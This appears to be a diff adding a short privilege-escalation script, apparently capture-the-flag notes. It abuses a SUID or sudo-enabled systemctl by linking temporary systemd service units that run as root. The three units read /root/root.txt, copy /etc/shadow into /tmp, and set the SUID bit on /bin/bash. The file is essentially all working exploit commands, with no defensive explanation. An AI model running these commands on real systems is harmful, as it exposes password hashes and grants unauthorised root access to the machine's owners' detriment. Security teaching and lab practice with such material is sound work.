@@ -1,0 +1,43 @@
+# this top line is only for non-suid
+# sudo install -m =xs $(which systemctl) .
+
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "cat /root/root.txt  >> /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+./systemctl link $TF
+./systemctl enable --now $TF
+
+
+
+
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "cat /etc/shadow  >> /tmp/shadowcopy"
+[Install]
+WantedBy=multi-user.target' > $TF
+# then link and enable the service: 
+# /systemctl link $TF
+/bin/systemctl link $TF
+# ./systemctl enable --now $TF
+/bin/systemctl enable --now $TF
+
+
+
+
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "chmod u+s /bin/bash"
+[Install]
+WantedBy=multi-user.target' > $TF
+# then link and enable the service: 
+# /systemctl link $TF
+/bin/systemctl link $TF
+# ./systemctl enable --now $TF
+/bin/systemctl enable --now $TF
+
+
